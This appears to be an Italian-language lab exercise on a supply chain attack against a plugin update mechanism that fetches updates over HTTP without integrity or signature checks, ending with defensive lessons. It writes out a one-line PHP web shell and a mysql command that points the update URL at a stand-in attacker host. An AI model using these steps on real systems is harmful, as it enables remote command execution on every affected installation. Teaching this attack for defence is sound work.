⛓️ Esercizio 6: Supply Chain Attack

Compromettere gli aggiornamenti per colpire tutti gli utenti
🎯 Il Problema
Il sistema scarica aggiornamenti da URL senza verificare:

• HTTPS: usa HTTP (MITM possibile)
• Certificato: nessuna verifica
• Hash: nessun controllo integrità
• Firma: nessuna verifica autenticità

Impatto: Tutti i sistemi che usano il plugin vengono compromessi!
🤔 Scenari di Attacco
1. Compromissione Server:
L'attaccante compromette il server di aggiornamenti e sostituisce i file

2. Man-in-the-Middle:
Intercetta traffico HTTP e sostituisce il download

3. DNS Poisoning:
Reindirizza il dominio a un server malevolo
📝 L'Attacco (via Database)
Step 1: Crea un plugin malevolo su un server che controlli:
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/malicious.php

Step 2: Modifica l'URL di aggiornamento nel database:
mysql -h localhost -P 3308 -u root -prootpassword plugin_system UPDATE plugin_updates SET update_url = 'http://attacker.com/malicious.php' WHERE id = 1;

Step 3: L'admin clicca "Aggiorna Plugin" → il sistema scarica e installa il tuo file malevolo!
🛡️ Lezione per il Difensore
1. Usa solo HTTPS per gli aggiornamenti
2. Verifica il certificato SSL
3. Verifica hash SHA-256 dopo il download
4. Implementa firma digitale dei pacchetti
